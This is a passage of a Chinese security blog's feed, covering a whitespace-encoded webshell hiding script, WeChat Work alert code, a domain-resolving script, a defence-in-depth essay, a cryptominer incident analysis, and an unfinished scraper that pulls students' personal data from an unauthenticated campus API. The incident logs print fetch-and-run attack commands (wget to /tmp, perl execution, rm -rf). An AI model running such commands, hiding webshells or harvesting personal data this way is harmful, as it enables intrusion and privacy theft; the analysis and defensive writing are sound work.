16)</span><br><span class="line">onesPlace = int(hex(ord(blank[i]))[3], 16)</span><br><span class="line"><span class="keyword">if</span> content[i][-1] == <span class="string">'\n'</span>:</span><br><span class="line">content[i] = content[i][0:-1] + tensPlace*<span class="string">'\t'</span> + onesPlace*<span class="string">' '</span> + <span class="string">'\n'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">content[i] = content[i] + tensPlace*<span class="string">'\t'</span> + onesPlace*<span class="string">' '</span> + <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">fout.write(line)</span><br><span class="line"></span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure></p><p>利用python脚本来实现从指定代码到空格和/t的添加。这样就在之前的那个文件里面构造了合适的空格和/t来表示恶意代码。生成新的文件便是我们最终的恶意文件了。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-d1684b820a0ee255.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="111"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;一个过人的小马&quot;&gt;&lt;a href=&quot;#一个过人的小马&quot; class=&quot;
      
    
    </summary>
    
      <category term="webshell" scheme="https://XD0ne.github.io/categories/webshell/"/>
    
    
      <category term="webshell" scheme="https://XD0ne.github.io/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>企业微信告警和回调</title>
    <link href="https://XD0ne.github.io/2019/08/22/27.%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E5%91%8A%E8%AD%A6%E4%BB%A5%E5%8F%8A%E5%9B%9E%E8%B0%83/"/>
    <id>https://XD0ne.github.io/2019/08/22/27.企业微信告警以及回调/</id>
    <published>2019-08-22T04:00:00.000Z</published>
    <updated>2020-03-04T16:59:03.885Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="企业微信告警和回调"><a href="#企业微信告警和回调" class="headerlink" title="企业微信告警和回调"></a>企业微信告警和回调</h1><hr><p>最近正在参与一次护网行动，学到很多东西，等这次结束再来好好谈谈收获和总结吧，这都是后话了。这次主要分享一下企业微信的告警以及回调的实现以及踩的坑。<br>先说说前因后果吧，在护网行动正式开打之前，我们对xx公司也进行详细的网络情况了解，以及合作梳理。具体之后再说，反正结论就是网络边界的梳理和整顿都已经弄得比较不错了，唯一存在问题的就是在一些waf以及ids的告警上，因为策略全部default开启，导致出现大量的告警情况，为对攻击的分析以及响应带来很多麻烦，因此我们一部分工作在整理和梳理网络告警的方面。<br>他们一共有三个网络告警的设备，防火墙，ids，F5等，都是通过同一个zabbix发送请求到告警平台进行告警。于是我们在阿里云上建立了一个soc(安全运营中心)，上面搭了elk，zabbix将三个网络告警全部发送到这个elk上……..之后再说。最后将soc上整理之后的告警发送到企业微信，并达到通过在企业微信上回复消息，对ip进行增删黑名单的操作。<br>企业微信回调过程：</p><ol><li>创建企业微信应用：登录企业微信-&gt;应用与小程序-&gt;自建-&gt;创建应用</li><li>创建了之后<br><img src="https://upload-images.jianshu.io/upload_images/6269327-da186556fe2ffd5b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="111"><br>设置api接收进行。设置api接收时需要进行回调验证，部署好后面那个回调代码就行。<br>发送告警很简单。根据企业微信给的api文档说明以及示例代码可以写出来。我这里用的是python3：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/6/2</span></span><br><span class="line"><span class="comment"># @Author  : XDN01</span></span><br><span class="line"><span class="comment"># @Site    : www.raosong.cc</span></span><br><span class="line"><span class="comment"># @File    : sent_wexin.py</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(<span class="string">'/getmsg'</span>,methods=[<span class="string">'POST'</span>])</span><br><span class="line">def index():</span><br><span class="line">    corpid = <span class="string">"xxxxxxxxxxx"</span></span><br><span class="line">    secret = <span class="string">"xxxxxxxxxxxxxxxx"</span></span><br><span class="line">    agentid = <span class="string">"xxxxxxxxx"</span></span><br><span class="line">    <span class="comment">#if request.method == 'GET':</span></span><br><span class="line">     <span class="comment">#   return 'Deny'</span></span><br><span class="line">     <span class="comment">#接收POST的数据</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form.get(<span class="string">'checkid'</span>) == <span class="string">'checkid'</span>:  <span class="comment"># 校验的id，避免有人恶意发送</span></span><br><span class="line">            GetMsg = request.form.get(<span class="string">'msg'</span>)</span><br><span class="line">            <span class="built_in">print</span>(GetMsg)</span><br><span class="line">            wechat = WeChat(corpid, secret, agentid)</span><br><span class="line">            <span class="keyword">if</span> wechat.send_message(GetMsg) == 1:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'Sent to weixin successed'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'Failed'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'Deny'</span></span><br><span class="line"></span><br><span class="line">class WeChat(object):</span><br><span class="line">    def __init__(self, corpid, secret, agentid):</span><br><span class="line">        self.url = <span class="string">"https://qyapi.weixin.qq.com"</span></span><br><span class="line">        self.corpid = corpid</span><br><span class="line">        self.secret = secret</span><br><span class="line">        self.agentid = agentid</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取企业微信的 access_token</span></span><br><span class="line">    def access_token(self):</span><br><span class="line">        url_arg = <span class="string">'/cgi-bin/gettoken?corpid=&#123;id&#125;&amp;corpsecret=&#123;crt&#125;'</span>.format(</span><br><span class="line">            id=self.corpid, crt=self.secret)</span><br><span class="line">        url = self.url + url_arg</span><br><span class="line">        response = requests.get(url=url)</span><br><span class="line">        text = response.text</span><br><span class="line">        self.token = json.loads(text)[<span class="string">'access_token'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建消息格式</span></span><br><span class="line">    def messages(self, msg):</span><br><span class="line">        values = &#123;</span><br><span class="line">            <span class="string">"touser"</span>: <span class="string">'@all'</span>,</span><br><span class="line">            <span class="comment"># "toparty" : "PartyID1|PartyID2",   # 向这些部门发送  #'@all'给所有的发</span></span><br><span class="line">            <span class="string">"msgtype"</span>: <span class="string">'text'</span>,</span><br><span class="line">            <span class="string">"agentid"</span>: self.agentid,</span><br><span class="line">            <span class="string">"text"</span>: &#123;<span class="string">'content'</span>: msg&#125;,</span><br><span class="line">            <span class="string">"safe"</span>: 0</span><br><span class="line">        &#125;</span><br><span class="line">        self.msg = (bytes(json.dumps(values), <span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送信息</span></span><br><span class="line">    def send_message(self, msg):</span><br><span class="line">        self.access_token()</span><br><span class="line">        self.messages(msg)</span><br><span class="line">        send_url = <span class="string">'&#123;url&#125;/cgi-bin/message/send?access_token=&#123;token&#125;'</span>.format(url=self.url, token=self.token)</span><br><span class="line">        response = requests.post(url=send_url, data=self.msg)</span><br><span class="line">        errcode = json.loads(response.text)[<span class="string">'errcode'</span>]</span><br><span class="line">        <span class="keyword">if</span> errcode == 0:</span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> 0</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=8000,debug=True)</span><br></pre></td></tr></table></figure></li></ol><p>下面是用户将数据发送给企业微信上的应用，回调发送到soc上进行记录，这里是记录在文件中：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">from flask import Flask,request</span><br><span class="line">from WXBizMsgCrypt import WXBizMsgCrypt</span><br><span class="line">import xml.etree.cElementTree as ET</span><br><span class="line">import sys</span><br><span class="line">from RedisUtil import RedisUtil</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(<span class="string">'/weixin'</span>, methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def index():</span><br><span class="line">    sToken = <span class="string">'xxxxxxxx'</span></span><br><span class="line">    sEncodingAESKey = <span class="string">'xxxxxxxxxxxxxxxxx'</span></span><br><span class="line">    sCorpID = <span class="string">'xxxxxxxxxxxx'</span></span><br><span class="line">    wxcpt=WXBizMsgCrypt(sToken,sEncodingAESKey,sCorpID)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取url验证时微信发送的相关参数</span></span><br><span class="line">    sVerifyMsgSig=request.args.get(<span class="string">'msg_signature'</span>)</span><br><span class="line">    sVerifyTimeStamp=request.args.get(<span class="string">'timestamp'</span>)</span><br><span class="line">    sVerifyNonce=request.args.get(<span class="string">'nonce'</span>)</span><br><span class="line">    sVerifyEchoStr=request.args.get(<span class="string">'echostr'</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    sReqMsgSig = sVerifyMsgSig</span><br><span class="line">    sReqTimeStamp = sVerifyTimeStamp</span><br><span class="line">    sReqNonce = sVerifyNonce</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    sResqMsgSig = sVerifyMsgSig</span><br><span class="line">    sResqTimeStamp = sVerifyTimeStamp</span><br><span class="line">    sResqNonce = sVerifyNonce</span><br><span class="line">    <span class="comment">#验证url</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        ret,sEchoStr=wxcpt.VerifyURL(sVerifyMsgSig, sVerifyTimeStamp,sVerifyNonce,sVerifyEchoStr)</span><br><span class="line">        <span class="keyword">if</span> (ret != 0 ):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"ERR: VerifyURL ret:"</span>,ret)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">        <span class="built_in">return</span> sEchoStr</span><br><span class="line"></span><br><span class="line">    <span class="comment">#接收客户端消息</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        sReqMsgSig = sVerifyMsgSig</span><br><span class="line">        sReqTimeStamp = sVerifyTimeStamp</span><br><span class="line">        sReqNonce = sVerifyNonce</span><br><span class="line">        sReqData = request.data</span><br><span class="line"></span><br><span class="line">        ret,sMsg=wxcpt.DecryptMsg( sReqData, sReqMsgSig, sReqTimeStamp, sReqNonce)</span><br><span class="line">        <span class="keyword">if</span> (ret != 0):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"ERR: VerifyURL ret:"</span>)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#解析发送的内容</span></span><br><span class="line">        xml_tree = ET.fromstring(sMsg)</span><br><span class="line">        content = xml_tree.find(<span class="string">"Content"</span>).text</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">        <span class="comment">#将接收到的内容记录在文件当中</span></span><br><span class="line">        f1 = open(<span class="string">'weixin_soc_get.txt'</span>, <span class="string">'a'</span>)</span><br><span class="line">        f1.writelines(content+<span class="string">"\n"</span>)</span><br><span class="line">        f1.close()</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"OK"</span> <span class="comment"># 默认发送三次 ，接收到ok之后就不会重复发送</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=9999,debug=True)</span><br></pre></td></tr></table></figure></p><p>直接更改代码中的token和企业id什么的就能直接用，具体的可以参考官方文档<a href="https://work.weixin.qq.com/api/doc" target="_blank" rel="noopener">https://work.weixin.qq.com/api/doc</a><br>以及官方github库<a href="https://github.com/sbzhu/weworkapi_python" target="_blank" rel="noopener">https://github.com/sbzhu/weworkapi_python</a><br>带上官方这里给的是python2的，而且给的代码库还会有一些问题，主要就是WXBizMsgCrypt.py这个文件，具体的我已经进行更改，在我的github项目中，可以直接替换就行：<a href="https://github.com/rliyuqing/weworkapi_py3" target="_blank" rel="noopener">https://github.com/rliyuqing/weworkapi_py3</a><br>回调和发送信息创建的webserver用nginx代理就行，十分方便:<br><img src="https://upload-images.jianshu.io/upload_images/6269327-86b09a2184875ac7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="nginx代理"><br>统一端口开放很重要的。其他的内容下次在分享，主要刚刚把企业微信告警的来回的两条线走通，所以记录分享一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;企业微信告警和回调&quot;&gt;&lt;a href=&quot;#企业微信告警和回调&quot; cla
      
    
    </summary>
    
      <category term="日志/告警" scheme="https://XD0ne.github.io/categories/%E6%97%A5%E5%BF%97-%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="日志/告警" scheme="https://XD0ne.github.io/tags/%E6%97%A5%E5%BF%97-%E5%91%8A%E8%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>python根据域名获取ip</title>
    <link href="https://XD0ne.github.io/2019/06/01/26.python%E6%A0%B9%E6%8D%AE%E5%9F%9F%E5%90%8D%E8%8E%B7%E5%8F%96ip/"/>
    <id>https://XD0ne.github.io/2019/06/01/26.python根据域名获取ip/</id>
    <published>2019-06-01T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.803Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="python根据域名获取ip"><a href="#python根据域名获取ip" class="headerlink" title="python根据域名获取ip"></a>python根据域名获取ip</h1><hr><p>过完年了，重新开始搬砖了。最近客户公司要进行全面的安全检测，于是给我们了一份很全的域名列表，然后让我们从外网进行简单的测试，但是这个域名实在是太多太多了，而且公司的域名很打一部分都是解析到内网的，外网根本无法访问，于是写了个简单的小脚本进行筛选，主要功能就是获取域名所对应的ip以及剔除解析到内网的域名。用队列和多线程的结构，速度能快很多，毕竟量上去了单线程还是很慢的。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/02/25</span></span><br><span class="line"><span class="comment"># @Author  : XDN01</span></span><br><span class="line"><span class="comment"># @Site    : www.raosong.cc</span></span><br><span class="line"><span class="comment"># @File    : get_public_ip.py</span></span><br><span class="line">import socket</span><br><span class="line">import csv</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">q = queue.Queue()</span><br><span class="line">threading_num = 50</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with open(<span class="string">"alldomain.txt"</span> , <span class="string">"r"</span>) as f:</span><br><span class="line">    filedata = f.readlines()</span><br><span class="line">    q.put(filedata)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line">    <span class="keyword">while</span> not q.empty():</span><br><span class="line">        filedata = q.get()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> filedata:</span><br><span class="line">            url = str(i).replace(<span class="string">"\n"</span>,<span class="string">''</span>)</span><br><span class="line">            <span class="comment">#print(url)</span></span><br><span class="line">            try:</span><br><span class="line">                myaddr = socket.getaddrinfo(url, <span class="string">'http'</span>)</span><br><span class="line">                <span class="comment">#print(str(myaddr[0][4][0])[:3])</span></span><br><span class="line">                <span class="keyword">if</span> str(myaddr[0][4][0])[:3] != str(172):</span><br><span class="line">                    <span class="comment">#print(url+" "+str(myaddr[0][4][0]))</span></span><br><span class="line">                    <span class="comment">#value_array.append(url).append(str(myaddr[0][4][0]))</span></span><br><span class="line">                    with open(<span class="string">"public_domain.csv"</span>,<span class="string">"a"</span>) as fw:</span><br><span class="line">                        writer = csv.writer(fw)</span><br><span class="line">                        writer.writerow([url,str(myaddr[0][4][0])])</span><br><span class="line">            except:</span><br><span class="line">                <span class="comment">#print('can't open')</span></span><br><span class="line">                pass</span><br><span class="line">        <span class="comment">#f.close()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'begin'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threading_num):</span><br><span class="line">        t = threading.Thread(target=run)</span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'over'</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;python根据域名获取ip&quot;&gt;&lt;a href=&quot;#python根据域
      
    
    </summary>
    
      <category term="小脚本" scheme="https://XD0ne.github.io/categories/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
    
      <category term="小脚本" scheme="https://XD0ne.github.io/tags/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>内网隔离和纵深防御浅谈</title>
    <link href="https://XD0ne.github.io/2019/02/22/25.%E5%86%85%E7%BD%91%E9%9A%94%E7%A6%BB%E5%92%8C%E7%BA%B5%E6%B7%B1%E9%98%B2%E5%BE%A1%E6%B5%85%E8%B0%88/"/>
    <id>https://XD0ne.github.io/2019/02/22/25.内网隔离和纵深防御浅谈/</id>
    <published>2019-02-22T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.802Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="内网隔离和纵深防御浅谈"><a href="#内网隔离和纵深防御浅谈" class="headerlink" title="内网隔离和纵深防御浅谈"></a>内网隔离和纵深防御浅谈</h1><hr><p>今天在给客户的公司做日常的测试的时候发现了一个内网的系统对外开放了，本来这是一件挺正常的事情，因为企业总会出现各种生产环境的一些或大或小的变动，可能某些时候就会出现某个不该对外开放的系统对外开放了，但是因为都有验证甚至二次验证，所以安全隐患不是很高。这次的这个客户企业的机器之前也出现过几次内网系统对外网公开了，但是都没有用什么大的威胁，外网的可操作性也很少，爆破账号密码都十分的困难。但是这次的对外开放的这个系统竟然出现了可以直接匿名用户登录并web端执行脚本的情况，虽然匿名用户没有执行sh脚本的额权限，但是有执行python脚本的权限，可以直接反弹shell，于是赶紧联系了老板，与客户公司取得联系及时修复漏洞。<br>是一个Zeppelin的线上系统的匿名用户登录的情况。为什么这次要特点说一说这次遇到的情况呢？因为这是我所期待，也是预料之中会出现的情况。<br>之前在客户的公司实习了一段时间。再去客户的公司事实习之前，自己也对他们有一些简单的测试，发现他们内外网隔离做的很好，改对外开放的对外开放，不该对外开放的一个都访问不了。但是在公司实习的时候，进入内网之后才发现内网的各种系统还是很乱的，许多系统为了方便都是没有验证机制的，甚至连企业的wiki文档系统都不需要验证员工身份，里面许多敏感文件。这就让我想起了之前老板和我们说过的，那些表面安全工作做得很好的内部可能漏洞百出，在实习的两个礼拜内，企业内部的src也是刷了很多。所以我觉得肯定会出现问题，只有某个系统因为谋些环境变动而对外网开放，就很容易被攻击者轻松日穿。<br>其实这也是企业发展的正常道路，客户公司也是最近才成立安全部门的，在资源有限的情况下优先做好内外网隔离是个正确的选择。但是只做内网隔离不做纵深防御是错误的。<br>做好内网隔离是企业安全的基础，在资源有限的情况下优先做内网隔离，但是纵深防御也是十分必要的。认为做好了隔离而忽略了内网的防御，就很容易出现一旦有机器在公网暴露就会被轻松攻破。风险分析的模型不止包括事件发生的概率，还有产生的危险程度。低概率但是带来严重影响的攻击也是会出现高风险值。资源有限的情况也需要考虑到资源的合理分配了，优先做隔离是资源最大化利用的有效手段。<br>优先做隔离没有错，只做隔离却没有做纵深防御是错的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;内网隔离和纵深防御浅谈&quot;&gt;&lt;a href=&quot;#内网隔离和纵深防御浅谈&quot;
      
    
    </summary>
    
      <category term="安全知识" scheme="https://XD0ne.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://XD0ne.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>一次挖矿病毒攻击分析</title>
    <link href="https://XD0ne.github.io/2018/10/15/24.%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    <id>https://XD0ne.github.io/2018/10/15/24.一次挖矿病毒攻击分析/</id>
    <published>2018-10-15T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.801Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="一次挖矿病毒攻击分析"><a href="#一次挖矿病毒攻击分析" class="headerlink" title="一次挖矿病毒攻击分析"></a>一次挖矿病毒攻击分析</h1><hr><p>这两天期末了，最近老板这里突然来了个任务，客户服务器被攻击了，某台机器的cpu一直都跑满了，持续高负荷状态，客户公司的运营实在没有办法找到了我们。<br>先说一说之前这台服务器也出现过问题，被两波人搞过，一波写了webshell，另个一种了挖矿病毒，都被清除了，当然这些我都没有参与。<br>因为老板比较忙，我和另一个小伙伴接手进行分析，我们拿到这台服务器，既然是web服务器，最好得最有效的办法就是看web日志，但是这个日志是在很多，这就考虑经验问题了，另一个小伙伴道行比我深，他发现了痕迹：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat aso_access.log | grep <span class="string">"wget"</span> | grep <span class="string">"/2019"</span>|grep <span class="string">"200"</span></span><br></pre></td></tr></table></figure></p><p>通过很多尝试，在筛选“wget”的时候找到了攻击痕迹。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - - [xx/xx/2019:xx:xx:xx +0800] <span class="string">"POST /?module=wget [http://xxx.xxx.xxx.xxx/ibus](http://xxx.xxx.xxx.xxx/ibus) -O /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 2979 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p><p>emmmmm，看到这个POST的请求，基本可以猜测出就是这几天爆出的thinkphp新的rce，具体读者可以去看看相关的报告，rce的分析网上也有了，有想去的可以去了解一下。根据这条日志，筛选ip我们找到了具体的攻击痕迹：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - - [xx/xx/2019:xx:xx:xx +0800] <span class="string">"POST /?module=wget [http://xxx.xxx.xxx.xxx/ibus](http://xxx.xxx.xxx.xxx/ibus) -O /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 2979 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p><p>上传ibus脚本文件到tmp目录下命名为指定文件，这里www用户有对tmp目录的读写权限。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - -  [xx/xx/2019:xx:xx:xx +0800]  <span class="string">"POST /?module=perl /tmp/6b5a412bb56c0f0af33017cc88718de3;sleep 2;rm -rf /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 3699 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p><p>执行tmp中上传的指定文件，并等待执行完成，删除文件.<br>本地虚拟环境执行了一下这个ibus脚本：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-c63d320e2b0401d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="本地执行脚本"><br>可以看到这里执行生成了三个sh简单加密的脚本文件：nmi，nbus和.dbus是哪个文件，这三个脚本文件解密之后是三个cat和perl的脚本，分别执行了一下命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /xxx/xxx/xxx/xxx/Favicon.ico | perl</span><br><span class="line">$ cat /xxx/xxx/pkcs | perl</span><br><span class="line">$ cat /xxx/xxx/xxx/xxxxx/xxx/xxxxxx/mockup | perl</span><br></pre></td></tr></table></figure></p><p>执行了三个perl脚本，就是挖矿的脚本了。最后我们把生成的恶意文件备份之后就进行清除了，总共是三个sh脚本，三个perl挖矿脚本和两个记录id的随机数之类的文件。<br>怎么说呢，这次攻击分析看似挺简单的，但是最难的部分，从日志里找出攻击者的恶意访问是很困难的，需要有很多的经验，比如对最近新漏洞的了解，以及各类典型漏洞的攻击方式，才能及时的从庞大的日志文件中根据特征找到攻击者的痕迹。<br>安全从业者还是十分吃经验的，博主也会更多的在实战中历练自己，也会分享记录自己的经验。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;一次挖矿病毒攻击分析&quot;&gt;&lt;a href=&quot;#一次挖矿病毒攻击分析&quot; c
      
    
    </summary>
    
      <category term="攻击分析" scheme="https://XD0ne.github.io/categories/%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    
    
      <category term="攻击分析" scheme="https://XD0ne.github.io/tags/%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>校园提供给第三方的接口信息泄露</title>
    <link href="https://XD0ne.github.io/2018/08/02/23.%E6%A0%A1%E5%9B%AD%E6%8F%90%E4%BE%9B%E7%BB%99%E7%AC%AC%E4%B8%89%E6%96%B9%E7%9A%84%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <id>https://XD0ne.github.io/2018/08/02/23.校园提供给第三方的接口信息泄露/</id>
    <published>2018-08-02T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.800Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="校园提供给第三方的接口信息泄露"><a href="#校园提供给第三方的接口信息泄露" class="headerlink" title="校园提供给第三方的接口信息泄露"></a>校园提供给第三方的接口信息泄露</h1><hr><p>之前学校和第三方合作，让我们用到的某款app，好奇测试，发现其有严重的身份验证缺失，可以随意访问个人信息，用python写了个可以爬取所有信息的脚本。（很早之前的了，做个记录）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2018/6/23</span><br><span class="line"># @Author  : XDN01</span><br><span class="line"># @Site    : www.raosong.cc</span><br><span class="line"># @File    : xd-xiaoweiapp-spider.py</span><br><span class="line">import requests</span><br><span class="line">import csv</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">with open(&quot;./spider.csv&quot;,&quot;w&quot;,encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    key_array = [&apos;userId&apos;,&apos;userNum&apos;,&apos;name&apos;,&apos;sex&apos;,&apos;address&apos;,&apos;certificate&apos;,&apos;nationId&apos;,&apos;nationName&apos;,</span><br><span class="line">   &apos;phone&apos;,&apos;email&apos;,&apos;schoolName&apos;,&apos;faculty&apos;,&apos;grade&apos;,&apos;class&apos;,&apos;profession&apos;,&apos;sysStuDetailId&apos;,&apos;sourceId&apos;,</span><br><span class="line">    &apos;sourceName&apos;,&apos;feature&apos;,&apos;type&apos;,&apos;suspId&apos;]</span><br><span class="line">    writer.writerow(key_array)</span><br><span class="line"></span><br><span class="line">    for a in range(2,20):</span><br><span class="line">        url = &apos;http://example.com/search.php?userId=&#123;&#125;&apos;.format(a)</span><br><span class="line">        json_data =requests.get(url).json()[&apos;data&apos;]</span><br><span class="line">        # print(json_data)</span><br><span class="line">        value_array = []</span><br><span class="line">        for k in key_array:</span><br><span class="line">            if k in json_data:</span><br><span class="line">                value_array.append(json_data[k])</span><br><span class="line">            else:</span><br><span class="line">                value_array.append(&apos;null&apos;)</span><br><span class="line">        # print(value_array)</span><br><span class="line">        